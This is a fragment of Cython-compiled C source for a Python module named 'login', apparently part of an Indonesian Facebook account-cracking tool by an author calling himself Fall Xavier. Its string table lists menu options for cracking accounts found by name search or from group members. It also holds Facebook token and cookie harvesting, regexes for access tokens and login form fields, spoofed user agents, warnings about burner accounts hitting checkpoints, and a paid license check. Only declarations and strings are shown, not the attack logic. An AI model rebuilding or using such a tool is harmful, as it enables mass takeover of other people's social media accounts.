#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check);
#else
#define __Pyx_PyInt_AddObjC(op1, op2, intval, inplace, zerodivision_check)\
    (inplace ? PyNumber_InPlaceAdd(op1, op2) : PyNumber_Add(op1, op2))
#endif


#if CYTHON_USE_PYLIST_INTERNALS && CYTHON_ASSUME_SAFE_MACROS
static CYTHON_INLINE int __Pyx_PyList_Append(PyObject* list, PyObject* x) {
    PyListObject* L = (PyListObject*) list;
    Py_ssize_t len = Py_SIZE(list);
    if (likely(L->allocated > len) & likely(len > (L->allocated >> 1))) {
        Py_INCREF(x);
        PyList_SET_ITEM(list, len, x);
        __Pyx_SET_SIZE(list, len + 1);
        return 0;
    }
    return PyList_Append(list, x);
}
#else
#define __Pyx_PyList_Append(L,x) PyList_Append(L,x)
#endif


static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method);


static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg);


static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x);


#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_SubtractObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check);
#else
#define __Pyx_PyInt_SubtractObjC(op1, op2, intval, inplace, zerodivision_check)\
    (inplace ? PyNumber_InPlaceSubtract(op1, op2) : PyNumber_Subtract(op1, op2))
#endif


static void __Pyx_RaiseArgtupleInvalid(const char* func_name, int exact,
    Py_ssize_t num_min, Py_ssize_t num_max, Py_ssize_t num_found);


static void __Pyx_RaiseDoubleKeywordsError(const char* func_name, PyObject* kw_name);


static int __Pyx_ParseOptionalKeywords(PyObject *kwds, PyObject **argnames[],\
    PyObject *kwds2, PyObject *values[], Py_ssize_t num_pos_args,\
    const char* function_name);


static CYTHON_INLINE PyObject* __Pyx_PyObject_FormatSimpleAndDecref(PyObject* s, PyObject* f);
static CYTHON_INLINE PyObject* __Pyx_PyObject_FormatAndDecref(PyObject* s, PyObject* f);


static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);


static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name);


static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type);


#define __Pyx_CyFunction_USED 1
#define __Pyx_CYFUNCTION_STATICMETHOD  0x01
#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02
#define __Pyx_CYFUNCTION_CCLASS        0x04
#define __Pyx_CyFunction_GetClosure(f)\
    (((__pyx_CyFunctionObject *) (f))->func_closure)
#define __Pyx_CyFunction_GetClassObj(f)\
    (((__pyx_CyFunctionObject *) (f))->func_classobj)
#define __Pyx_CyFunction_Defaults(type, f)\
    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))
#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\
    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)
typedef struct {
    PyCFunctionObject func;
#if PY_VERSION_HEX < 0x030500A0
    PyObject *func_weakreflist;
#endif
    PyObject *func_dict;
    PyObject *func_name;
    PyObject *func_qualname;
    PyObject *func_doc;
    PyObject *func_globals;
    PyObject *func_code;
    PyObject *func_closure;
    PyObject *func_classobj;
    void *defaults;
    int defaults_pyobjects;
    size_t defaults_size;  // used by FusedFunction for copying defaults
    int flags;
    PyObject *defaults_tuple;
    PyObject *defaults_kwdict;
    PyObject *(*defaults_getter)(PyObject *);
    PyObject *func_annotations;
} __pyx_CyFunctionObject;
static PyTypeObject *__pyx_CyFunctionType = 0;
#define __Pyx_CyFunction_Check(obj)  (__Pyx_TypeCheck(obj, __pyx_CyFunctionType))
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *self,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *m,
                                                         size_t size,
                                                         int pyobjects);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *m,
                                                            PyObject *tuple);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *m,
                                                             PyObject *dict);
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *m,
                                                              PyObject *dict);
static int __pyx_CyFunction_init(void);


static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *closure,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);


#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif


typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);


static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);


#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif


static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);


static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);


static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);


static int __Pyx_check_binary_version(void);


static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);



#define __Pyx_MODULE_NAME "login"
extern int __pyx_module_is_main_login;
int __pyx_module_is_main_login = 0;


static PyObject *__pyx_builtin_exit;
static PyObject *__pyx_builtin_ValueError;
static PyObject *__pyx_builtin_open;
static PyObject *__pyx_builtin_input;
static PyObject *__pyx_builtin_KeyError;
static PyObject *__pyx_builtin_print;
static PyObject *__pyx_builtin_AttributeError;
static const char __pyx_k_[] = " ";
static const char __pyx_k_1[] = "1 ";
static const char __pyx_k_2[] = "2";
static const char __pyx_k_3[] = "3";
static const char __pyx_k_4[] = "4";
static const char __pyx_k_5[] = "5";
static const char __pyx_k_6[] = "6";
static const char __pyx_k_7[] = "7";
static const char __pyx_k_8[] = "8";
static const char __pyx_k_9[] = "9";
static const char __pyx_k_B[] = "B";
static const char __pyx_k_H[] = "H";
static const char __pyx_k_K[] = "K";
static const char __pyx_k_M[] = "M";
static const char __pyx_k_N[] = "N";
static const char __pyx_k_O[] = "O";
static const char __pyx_k_P[] = "P";
static const char __pyx_k_U[] = "U";
static const char __pyx_k_Y[] = "Y";
static const char __pyx_k_a[] = "a";
static const char __pyx_k_b[] = "b";
static const char __pyx_k_e[] = "e";
static const char __pyx_k_n[] = "n";
static const char __pyx_k_r[] = "r";
static const char __pyx_k_s[] = "%s";
static const char __pyx_k_w[] = "w";
static const char __pyx_k_y[] = "y";
static const char __pyx_k_01[] = "01";
static const char __pyx_k_02[] = "02";
static const char __pyx_k_03[] = "03";
static const char __pyx_k_04[] = "04";
static const char __pyx_k_05[] = "05";
static const char __pyx_k_06[] = "06";
static const char __pyx_k_07[] = "07";
static const char __pyx_k_08[] = "08";
static const char __pyx_k_09[] = "09";
static const char __pyx_k_0m[] = "\033[0m";
static const char __pyx_k_10[] = "10";
static const char __pyx_k_11[] = "11";
static const char __pyx_k_12[] = "12";
static const char __pyx_k_IP[] = "IP";
static const char __pyx_k__4[] = "  ";
static const char __pyx_k__5[] = " : ";
static const char __pyx_k_bu[] = "bu";
static const char __pyx_k_ct[] = "ct";
static const char __pyx_k_fr[] = ";fr=";
static const char __pyx_k_ha[] = "ha";
static const char __pyx_k_hr[] = "hr";
static const char __pyx_k_op[] = "op";
static const char __pyx_k_os[] = "os";
static const char __pyx_k_po[] = "po";
static const char __pyx_k_pw[] = "pw";
static const char __pyx_k_re[] = "re";
static const char __pyx_k_ta[] = "ta";
static const char __pyx_k_xs[] = ";xs=";
static const char __pyx_k_zz[] = "zz";
static const char __pyx_k_1_2[] = "1";
static const char __pyx_k_EAA[] = "EAA";
static const char __pyx_k_May[] = "May";
static const char __pyx_k_Mei[] = "Mei";
static const char __pyx_k_WAR[] = "WAR";
static const char __pyx_k__16[] = "";
static const char __pyx_k__22[] = ".";
static const char __pyx_k__23[] = "-";
static const char __pyx_k_bs4[] = "bs4";
static const char __pyx_k_cok[] = "cok";
static const char __pyx_k_das[] = "das";
static const char __pyx_k_day[] = "day";
static const char __pyx_k_dev[] = "&dev=";
static const char __pyx_k_dnt[] = "dnt";
static const char __pyx_k_exp[] = "exp";
static const char __pyx_k_get[] = "get";
static const char __pyx_k_lsd[] = "lsd";
static const char __pyx_k_may[] = "may";
static const char __pyx_k_mei[] = "mei";
static const char __pyx_k_now[] = "now";
static const char __pyx_k_num[] = "num";
static const char __pyx_k_pil[] = "pil";
static const char __pyx_k_red[] = "[red]";
static const char __pyx_k_ses[] = "ses";
static const char __pyx_k_src[] = "src";
static const char __pyx_k_sys[] = "sys";
static const char __pyx_k_tgl[] = "tgl";
static const char __pyx_k_uid[] = "uid";
static const char __pyx_k_url[] = "url";
static const char __pyx_k_Dump[] = "Dump";
static const char __pyx_k_Host[] = "Host";
static const char __pyx_k_INFO[] = "INFO";
static const char __pyx_k_Juli[] = "Juli";
static const char __pyx_k_July[] = "July";
static const char __pyx_k_June[] = "June";
static const char __pyx_k_Juni[] = "Juni";
static const char __pyx_k_Menu[] = "Menu";
static const char __pyx_k_Rabu[] = "Rabu";
static const char __pyx_k_Tree[] = "Tree";
static const char __pyx_k_blue[] = "[blue]";
static const char __pyx_k_bold[] = "[bold]";
static const char __pyx_k_cors[] = "cors";
static const char __pyx_k_cyan[] = "[cyan]";
static const char __pyx_k_data[] = "data";
static const char __pyx_k_date[] = "date";
static const char __pyx_k_datr[] = "datr=";
static const char __pyx_k_days[] = "days";
static const char __pyx_k_dump[] = "dump";
static const char __pyx_k_exit[] = "exit";
static const char __pyx_k_flow[] = "flow";
static const char __pyx_k_fr_2[] = "fr";
static const char __pyx_k_host[] = "host";
static const char __pyx_k_join[] = "join";
static const char __pyx_k_json[] = "json";
static const char __pyx_k_juli[] = "juli";
static const char __pyx_k_july[] = "july";
static const char __pyx_k_june[] = "june";
static const char __pyx_k_juni[] = "juni";
static const char __pyx_k_logo[] = "logo";
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_menu[] = "menu";
static const char __pyx_k_nama[] = "nama";
static const char __pyx_k_name[] = "name";
static const char __pyx_k_next[] = "next";
static const char __pyx_k_open[] = "open";
static const char __pyx_k_pass[] = "pass";
static const char __pyx_k_post[] = "post";
static const char __pyx_k_read[] = "read";
static const char __pyx_k_rich[] = "rich";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_text[] = "text";
static const char __pyx_k_time[] = "time";
static const char __pyx_k_user[] = "user";
static const char __pyx_k_xs_2[] = "xs";
static const char __pyx_k_year[] = "year";
static const char __pyx_k_1_91m[] = "\033[1;91m";
static const char __pyx_k_1_92m[] = "\033[1;92m";
static const char __pyx_k_1_93m[] = "\033[1;93m";
static const char __pyx_k_1_94m[] = "\033[1;94m";
static const char __pyx_k_1_95m[] = "\033[1;95m";
static const char __pyx_k_1_96m[] = "\033[1;96m";
static const char __pyx_k_1_97m[] = "\033[1;97m";
static const char __pyx_k_April[] = "April";
static const char __pyx_k_EAA_w[] = "EAA\\w+";
static const char __pyx_k_Jumat[] = "Jumat";
static const char __pyx_k_Kamis[] = "Kamis";
static const char __pyx_k_March[] = "March";
static const char __pyx_k_Maret[] = "Maret";
static const char __pyx_k_Panel[] = "Panel";
static const char __pyx_k_Pilih[] = "[?] Pilih ";
static const char __pyx_k_Sabtu[] = "Sabtu";
static const char __pyx_k_Senin[] = "Senin";
static const char __pyx_k_TOKEN[] = "TOKEN";
static const char __pyx_k_april[] = "april";
static const char __pyx_k_bulan[] = "bulan";
static const char __pyx_k_clear[] = "clear";
static const char __pyx_k_cv_hr[] = "cv_hr";
static const char __pyx_k_d_m_Y[] = "%d%m%Y";
static const char __pyx_k_data2[] = "data2";
static const char __pyx_k_delta[] = "delta";
static const char __pyx_k_email[] = "email";
static const char __pyx_k_empty[] = "empty";
static const char __pyx_k_garis[] = "garis";
static const char __pyx_k_green[] = "[green]";
static const char __pyx_k_group[] = "group";
static const char __pyx_k_https[] = "https://";
static const char __pyx_k_input[] = "input";
static const char __pyx_k_login[] = "login";
static const char __pyx_k_march[] = "march";
static const char __pyx_k_month[] = "month";
static const char __pyx_k_nTemp[] = "nTemp";
static const char __pyx_k_print[] = "print";
static const char __pyx_k_query[] = "query";
static const char __pyx_k_sleep[] = "sleep";
static const char __pyx_k_split[] = "split";
static const char __pyx_k_title[] = "title";
static const char __pyx_k_today[] = "today";
static const char __pyx_k_token[] = "token";
static const char __pyx_k_usage[] = "usage";
static const char __pyx_k_write[] = "write";
static const char __pyx_k_ApiKey[] = "ApiKey";
static const char __pyx_k_COOKIE[] = "COOKIE";
static const char __pyx_k_EAAG_w[] = "(EAAG\\w+)";
static const char __pyx_k_Friday[] = "Friday";
static const char __pyx_k_Minggu[] = "Minggu";
static const char __pyx_k_Monday[] = "Monday";
static const char __pyx_k_Sampai[] = "Sampai ";
static const char __pyx_k_Selasa[] = "Selasa";
static const char __pyx_k_Sunday[] = "Sunday";
static const char __pyx_k_accept[] = "accept";
static const char __pyx_k_apikey[] = "apikey";
static const char __pyx_k_append[] = "append";
static const char __pyx_k_august[] = "august";
static const char __pyx_k_c_user[] = "c_user";
static const char __pyx_k_choice[] = "choice";
static const char __pyx_k_chrome[] = "chrome";
static const char __pyx_k_cookie[] = "cookie";
static const char __pyx_k_datr_2[] = "datr";
static const char __pyx_k_device[] = "device";
static const char __pyx_k_header[] = "header";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_name_2[] = "__name__";
static const char __pyx_k_origin[] = "origin";
static const char __pyx_k_parser[] = "parser";
static const char __pyx_k_prints[] = "prints";
static const char __pyx_k_random[] = "random";
static const char __pyx_k_remove[] = "remove";
static const char __pyx_k_search[] = "search";
static const char __pyx_k_status[] = "status";
static const char __pyx_k_system[] = "system";
static const char __pyx_k_tolkau[] = "tolkau";
static const char __pyx_k_Agustus[] = "Agustus";
static const char __pyx_k_Januari[] = "Januari";
static const char __pyx_k_January[] = "January";
static const char __pyx_k_October[] = "October";
static const char __pyx_k_Oktober[] = "Oktober";
static const char __pyx_k_Session[] = "Session";
static const char __pyx_k_Tuesday[] = "Tuesday";
static const char __pyx_k_agustus[] = "agustus";
static const char __pyx_k_bulan_x[] = "bulan_x";
static const char __pyx_k_convert[] = "convert";
static const char __pyx_k_cookies[] = "cookies";
static const char __pyx_k_current[] = "current";
static const char __pyx_k_expired[] = "expired";
static const char __pyx_k_findall[] = "findall";
static const char __pyx_k_headcok[] = "headcok";
static const char __pyx_k_header1[] = "header1";
static const char __pyx_k_headers[] = "headers";
static const char __pyx_k_januari[] = "januari";
static const char __pyx_k_january[] = "january";
static const char __pyx_k_jazoest[] = "jazoest";
static const char __pyx_k_my_date[] = "my_date";
static const char __pyx_k_october[] = "october";
static const char __pyx_k_oktober[] = "oktober";
static const char __pyx_k_referer[] = "referer";
static const char __pyx_k_tanggal[] = "tanggal";
static const char __pyx_k_weekday[] = "weekday";
static const char __pyx_k_December[] = "December";
static const char __pyx_k_Desember[] = "Desember";
static const char __pyx_k_Februari[] = "Februari";
static const char __pyx_k_February[] = "February";
static const char __pyx_k_KeyError[] = "KeyError";
static const char __pyx_k_MenuLain[] = "MenuLain";
static const char __pyx_k_November[] = "November";
static const char __pyx_k_Saturday[] = "Saturday";
static const char __pyx_k_Thursday[] = "Thursday";
static const char __pyx_k_c_user_2[] = ";c_user=";
static const char __pyx_k_calendar[] = "calendar";
static const char __pyx_k_cek_opsi[] = "cek_opsi";
static const char __pyx_k_ceklisen[] = "ceklisen";
static const char __pyx_k_datetime[] = "datetime";
static const char __pyx_k_day_name[] = "day_name";
static const char __pyx_k_december[] = "december";
static const char __pyx_k_desember[] = "desember";
static const char __pyx_k_document[] = "document";
static const char __pyx_k_february[] = "february";
static const char __pyx_k_get_dict[] = "get_dict";
static const char __pyx_k_login_py[] = "login.py";
static const char __pyx_k_menulain[] = "menulain";
static const char __pyx_k_november[] = "november";
static const char __pyx_k_platform[] = "platform";
static const char __pyx_k_readtext[] = "readtext";
static const char __pyx_k_requests[] = "requests";
static const char __pyx_k_sisahari[] = "sisahari";
static const char __pyx_k_strptime[] = "strptime";
static const char __pyx_k_September[] = "September";
static const char __pyx_k_Wednesday[] = "Wednesday";
static const char __pyx_k_bergabung[] = "bergabung";
static const char __pyx_k_bulan_ttl[] = "bulan_ttl";
static const char __pyx_k_cek_hasil[] = "cek_hasil";
static const char __pyx_k_datawaktu[] = "datawaktu";
static const char __pyx_k_freetoken[] = "freetoken";
static const char __pyx_k_get_token[] = "get_token";
static const char __pyx_k_max_age_0[] = "max-age=0";
static const char __pyx_k_nama_hari[] = "nama_hari";
static const char __pyx_k_real_time[] = "real_time";
static const char __pyx_k_rich_tree[] = "rich.tree";
static const char __pyx_k_september[] = "september";
static const char __pyx_k_ValueError[] = "ValueError";
static const char __pyx_k_bold_green[] = "]. [bold green]";
static const char __pyx_k_bold_white[] = "[bold white][";
static const char __pyx_k_checkpoint[] = "checkpoint";
static const char __pyx_k_deep_pink3[] = "[deep_pink3]";
static const char __pyx_k_exceptions[] = "exceptions";
static const char __pyx_k_find_token[] = "find_token";
static const char __pyx_k_get_cookie[] = "get_cookie";
static const char __pyx_k_kadaluarsa[] = "kadaluarsa";
static const char __pyx_k_kredensial[] = "kredensial";
static const char __pyx_k_rich_panel[] = "rich.panel";
static const char __pyx_k_user_agent[] = "user-agent";
static const char __pyx_k_Nama_Apikey[] = "\n[+] Nama Apikey       : ";
static const char __pyx_k_bulan_balik[] = "bulan_balik";
static const char __pyx_k_date_format[] = "date_format";
static const char __pyx_k_freetokenv1[] = "freetokenv1";
static const char __pyx_k_freetokenv2[] = "freetokenv2";
static const char __pyx_k_html_parser[] = "html.parser";
static const char __pyx_k_kadaluwarsa[] = "kadaluwarsa";
static const char __pyx_k_mark_via_gp[] = "mark.via.gp";
static const char __pyx_k_menu_apikey[] = "menu_apikey";
static const char __pyx_k_same_origin[] = "same-origin";
static const char __pyx_k_Email_Apikey[] = "\n[+] Email Apikey      : ";
static const char __pyx_k_content_type[] = "content-type";
static const char __pyx_k_gzip_deflate[] = "gzip, deflate";
static const char __pyx_k_limit_device[] = "limit-device";
static const char __pyx_k_login_no_pin[] = "login_no_pin";
static const char __pyx_k_BeautifulSoup[] = "BeautifulSoup";
static const char __pyx_k_Masukan_Email[] = "  [+] Masukan Email : ";
static const char __pyx_k_Masukan_Sandi[] = "  [+] Masukan Sandi : ";
static const char __pyx_k_Tgl_Bergabung[] = "\n[+] Tgl Bergabung     : ";
static const char __pyx_k_cache_control[] = "cache-control";
static const char __pyx_k_AttributeError[] = "AttributeError";
static const char __pyx_k_data_token_txt[] = "data/token.txt";
static const char __pyx_k_m_facebook_com[] = "m.facebook.com";
static const char __pyx_k_name_lsd_value[] = "name=\"lsd\" value=\"(.*?)\"";
static const char __pyx_k_sec_fetch_dest[] = "sec-fetch-dest";
static const char __pyx_k_sec_fetch_mode[] = "sec-fetch-mode";
static const char __pyx_k_sec_fetch_site[] = "sec-fetch-site";
static const char __pyx_k_sec_fetch_user[] = "sec-fetch-user";
static const char __pyx_k_ConnectionError[] = "ConnectionError";
static const char __pyx_k_Device_Terpakai[] = "\n[+] Device Terpakai   : ";
static const char __pyx_k_Tgl_Kadaluwarsa[] = "\n[+] Tgl Kadaluwarsa   : ";
static const char __pyx_k_accept_encoding[] = "accept-encoding";
static const char __pyx_k_accept_language[] = "accept-language";
static const char __pyx_k_allow_redirects[] = "allow_redirects";
static const char __pyx_k_bold_MENU_LOGIN[] = "[bold]| MENU LOGIN |";
static const char __pyx_k_data_apikey_txt[] = "data/.apikey.txt";
static const char __pyx_k_data_cookie_txt[] = "data/cookie.txt";
static const char __pyx_k_grup_tanpalogin[] = "grup_tanpalogin";
static const char __pyx_k_gzip_deflate_br[] = "gzip, deflate br";
static const char __pyx_k_bold_DATA_APIKEY[] = "[bold]| DATA APIKEY |";
static const char __pyx_k_device_Alamat_IP[] = " device\n[+] Alamat IP         : ";
static const char __pyx_k_masukan_token_fb[] = "  [+] masukan token fb : ";
static const char __pyx_k_x_requested_with[] = "x-requested-with";
static const char __pyx_k_FileNotFoundError[] = "FileNotFoundError";
static const char __pyx_k_Sisa_Waktu_Apikey[] = "\n[+] Sisa Waktu Apikey : ";
static const char __pyx_k_masukan_cookie_fb[] = "  [+] masukan cookie fb : ";
static const char __pyx_k_pencarian_nologin[] = "pencarian_nologin";
static const char __pyx_k_bold_Status_Apikey[] = "[bold][+] Status Apikey     : ";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_name_jazoest_value[] = "name=\"jazoest\" value=\"(.*?)\"";
static const char __pyx_k_rm_f_data_token_txt[] = "rm -f data/token.txt";
static const char __pyx_k_http_ip_api_com_json[] = "http://ip-api.com/json/";
static const char __pyx_k_https_m_facebook_com[] = "https://m.facebook.com/";
static const char __pyx_k_business_facebook_com[] = "business.facebook.com";
static const char __pyx_k_https_www_facebook_com[] = "https://www.facebook.com/";
static const char __pyx_k_bold_white_User_Premium[] = "[bold white] User Premium";
static const char __pyx_k_text_html_charset_utf_8[] = "text/html; charset=utf-8";
static const char __pyx_k_berhasil_menghapus_apikey[] = "  [#] berhasil menghapus apikey";
static const char __pyx_k_upgrade_insecure_requests[] = "upgrade-insecure-requests";
static const char __pyx_k_en_GB_en_US_q_0_9_en_q_0_8[] = "en-GB,en-US;q=0.9,en;q=0.8";
static const char __pyx_k_tidak_ada_koneksi_internet[] = " [!] tidak ada koneksi internet";
static const char __pyx_k_https_business_facebook_com[] = "https://business.facebook.com";
static const char __pyx_k_Pilih_Nomer_Token_Untuk_Login[] = "[?] Pilih Nomer Token Untuk Login : ";
static const char __pyx_k_bold_red_Email_atau_kata_sandi[] = "[bold red]Email atau kata sandi salah, silahkan login ulang dengan memasukan kata sandi yang benar";
static const char __pyx_k_bold_white_Selamat_Datang_bold[] = "[bold white]Selamat Datang [bold yellow]";
static const char __pyx_k_Mozilla_5_0_Linux_Android_6_0_1[] = "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36";
static const char __pyx_k_Mozilla_5_0_Linux_Android_8_1_0[] = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36";
static const char __pyx_k_apakah_kamu_ingin_menghapus_api[] = "  [?] apakah kamu ingin menghapus apikey? [Y/t]: ";
static const char __pyx_k_bold_01_Login_Dengan_Token_06_B[] = "[bold][01]. Login Dengan Token        [06]. Bot Token Gratis V1\n[02]. Login Dengan Cookies      [07]. Bot Token Gratis V2\n[03]. Login Dengan Kredensial   [08]. Lihat Akun Hasil Crack\n[04]. Crack Dari Pencarian Nama [09]. Cek Opsi Hasil Crack\n[05]. Crack Dari Member Grup    [10]. Hapus Lisensi (Premium)";
static const char __pyx_k_bold_red_Akun_tumbal_terkena_ch[] = "[bold red]Akun tumbal terkena checkpoint, silahkan gunakan akun lain untuk login";
static const char __pyx_k_bold_red_Cookie_invalid_atau_ti[] = "[bold red]Cookie invalid atau tidak bisa masuk, silahkan gunakan cookie lainnya";
static const char __pyx_k_bold_red_Maaf_lisensi_anda_tida[] = "[bold red]Maaf lisensi anda tidak valid, silahkan hubungi author untuk mendapatkan lisensi dengan cara membelinya";
static const char __pyx_k_bold_red_Token_invalid_atau_tid[] = "[bold red]Token invalid atau tidak bisa masuk, silahkan gunakan token lainnya";
static const char __pyx_k_bold_white_Author_Fall_Xavier_V[] = " \342\226\210\342\226\210\342\226\210\342\226\210\342\226\210\342\226\210\342\226\210 \342\226\210\342\226\210\342\226\210\342\226\210\342\226\210\342\226\210\342\226\210 \342\226\210\342\226\210\342\226\210\342\226\210\342\226\210\342\226\210   \342\226\210\342\226\210\342\226\210\342\226\210\342\226\210\342\226\210   \342\226\210\342\226\210\342\226\210    \342\226\210\342\226\210\342\226\210 \342\226\210\342\226\210\342\226\210\342\226\210\342\226\210\342\226\210  \342\226\210\342\226\210\342\226\210\342\226\210\342\226\210\342\226\210\342\226\210 \n    \342\226\210\342\226\210\342\226\210  \342\226\210\342\226\210      \342\226\210\342\226\210   \342\226\210\342\226\210 \342\226\210\342\226\210    \342\226\210\342\226\210  \342\226\210\342\226\210\342\226\210\342\226\210  \342\226\210\342\226\210\342\226\210\342\226\210 \342\226\210\342\226\210   \342\226\210\342\226\210 \342\226\210\342\226\210      \n   \342\226\210\342\226\210\342\226\210   \342\226\210\342\226\210\342\226\210\342\226\210\342\226\210   \342\226\210\342\226\210\342\226\210\342\226\210\342\226\210\342\226\210  \342\226\210\342\226\210    \342\226\210\342\226\210  \342\226\210\342\226\210 \342\226\210\342\226\210\342\226\210\342\226\210 \342\226\210\342\226\210 \342\226\210\342\226\210\342\226\210\342\226\210\342\226\210\342\226\210  \342\226\210\342\226\210\342\226\210\342\226\210\342\226\210   \n  \342\226\210\342\226\210\342\226\210    \342\226\210\342\226\210      \342\226\210\342\226\210   \342\226\210\342\226\210 \342\226\210\342\226\210    \342\226\210\342\226\210  \342\226\210\342\226\210  \342\226\210\342\226\210  \342\226\210\342\226\210 \342\226\210\342\226\210   \342\226\210\342\226\210 \342\226\210\342\226\210      \n \342\226\210\342\226\210\342\226\210\342\226\210\342\226\210\342\226\210\342\226\210 \342\226\210\342\226\210\342\226\210\342\226\210\342\226\210\342\226\210\342\226\210 \342\226\210\342\226\210   \342\226\210\342\226\210  \342\226\210\342\226\210\342\226\210\342\226""\210\342\226\210\342\226\210   \342\226\210\342\226\210      \342\226\210\342\226\210 \342\226\210\342\226\210\342\226\210\342\226\210\342\226\210\342\226\210  \342\226\210\342\226\210       \n            [bold white]Author : Fall Xavier   Version : 5.0";
static const char __pyx_k_id_ID_id_q_0_9_en_US_q_0_8_en_q[] = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7";
static const char __pyx_k_rm_f_data_token_txt_data_cookie[] = "rm -f data/token.txt data/cookie.txt";
static const char __pyx_k_text_html_application_xhtml_xml[] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
static const char __pyx_k_Anda_bisa_mengambil_cookie_denga[] = "Anda bisa mengambil cookie dengan menggunakan aplikasi kiwi browser dan menggunakan Cookiedugh, tidak disarankan menggunakan akun pribadi untuk menghindari hal-hal yang tidak diinginkan";
static const char __pyx_k_Anda_bisa_mengambil_token_dengan[] = "Anda bisa mengambil token dengan menggunakan aplikasi getaccestoken yang ada di apkpure.com, tidak disarankan menggunakan akun pribadi untuk menghindari hal-hal yang tidak diinginkan";
static const char __pyx_k_Mozilla_5_0_Linux_Android_12_SAM[] = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36";
static const char __pyx_k_NokiaC3_00_5_0_08_63_Profile_MID[] = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+";
static const char __pyx_k_Silahkan_masukkan_email_no_hp_id[] = "Silahkan masukkan email/no hp/id akun anda, jika autentikasi masih aktif silahkan matikan terlebih dahulu. tidak disarankan menggunakan akun pribadi untuk menghindari hal-hal yang tidak diinginkan";
static const char __pyx_k_application_x_www_form_urlencode[] = "application/x-www-form-urlencoded";
static const char __pyx_k_https_business_facebook_com_busi[] = "https://business.facebook.com/business_locations";
static const char __pyx_k_https_developers_facebook_com_to[] = "https://developers.facebook.com/tools/debug/accesstoken/";
static const char __pyx_k_https_fall_xavier_my_id_check_ph[] = "https://fall-xavier.my.id/check.php?key=";
static const char __pyx_k_https_free_facebook_com_10004070[] = "https://free.facebook.com/100040708001839/posts/716737126359881/?app=fbl";
static const char __pyx_k_https_graph_facebook_com_me_acce[] = "https://graph.facebook.com/me?&access_token=";
static const char __pyx_k_https_m_facebook_com_index_php_n[] = "https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F";
static const char __pyx_k_https_m_facebook_com_login_devic[] = "https://m.facebook.com/login/device-based/validate-password/?shbl=0";
static const char __pyx_k_text_html_application_xhtml_xml_2[] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
static const char __pyx_k_https_graph_facebook_com_me_acce_2[] = "https://graph.facebook.com/me?access_token=";
static PyObject *__pyx_kp_u_;
static PyObject *__pyx_kp_u_01;
static PyObject *__pyx_kp_u_02;
static PyObject *__pyx_kp_u_03;
static PyObject *__pyx_kp_u_04;
static PyObject *__pyx_kp_u_05;
static PyObject *__pyx_kp_u_06;
static PyObject *__pyx_kp_u_07;
static PyObject *__pyx_kp_u_08;
